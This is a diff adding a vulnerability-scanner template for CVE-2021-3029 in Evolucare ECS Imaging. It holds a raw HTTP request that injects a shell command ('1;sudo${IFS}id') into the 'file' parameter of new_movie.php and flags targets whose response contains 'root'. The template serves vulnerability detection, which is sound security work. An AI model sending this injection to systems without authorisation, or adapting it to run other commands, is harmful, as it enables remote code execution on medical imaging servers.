@@ -1,0 +1,36 @@
+id: evolucare-ecs-imaging-rce
+info:
+  name: Evolucare ECS Imaging RCE (CVE-2021-3029)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Evolucare ECS Imaging contains a remote command execution vulnerability in the `new_movie.php` file. This allows an attacker to execute arbitrary commands on the server.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-3029
+    - https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=5504
+  tags: rce, critical
+
+http:
+  - raw:
+      - |
+        GET /new_movie.php?studyUID=1&start=2&end=2&file=1;sudo${IFS}id HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root"
+      - type: status
+        status:
+          - 200
